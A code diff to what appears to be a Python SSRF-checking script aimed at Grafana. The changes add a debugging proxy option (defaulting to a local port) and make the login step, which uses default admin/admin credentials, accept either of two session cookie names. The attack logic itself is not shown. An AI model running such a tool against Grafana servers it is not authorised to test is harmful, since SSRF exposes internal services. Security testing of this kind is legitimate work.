@@ -27,6 +27,7 @@ parser.add_argument("-H", "--host", default="http://kubernetes.docker.internal:5
 parser.add_argument("-f", "--file", default="urls.txt",required=False, help="File of URLS to check SSRF Against")
 parser.add_argument("-U", "--username", default="admin",required=False, help="Username for Grafana")
 parser.add_argument("-P", "--password", default="admin",required=False, help="Password for Grafana")
+parser.add_argument("-p", "--proxy", default="http://127.0.0.1:8085",required=False, help="Proxy for debugging")
 
 args = parser.parse_args()
 ssrf_url = args.url
@@ -35,10 +36,10 @@ ghost = args.host
 files = args.file
 username = args.username
 password = args.password
+proxy = args.proxy
 
 
-
-http_proxy = ""
+http_proxy = proxy
 proxyDict = { 
               "http"  : http_proxy, 
               "https" : http_proxy, 
@@ -131,8 +132,10 @@ def login(ghost,username,password):
 	headers = {"Origin":""+ghost+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Referer":""+ghost+"/login","Connection":"close","content-type":"application/json","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
 	cookies = {"redirect_to":"%2F"}
 	response = session.post(""+ghost+"/login", data=rawBody, headers=headers, cookies=cookies,verify=False, proxies=proxyDict)
-	if response.cookies["grafana_session"]:
+	if "grafana_session" in response.cookies:
 		return response.cookies["grafana_session"]
+	if "grafana_sess" in response.cookies:
+		return response.cookies["grafana_sess"]
 	else:
 		print("Login Session Cookie not set")
 		sys.exit(0)
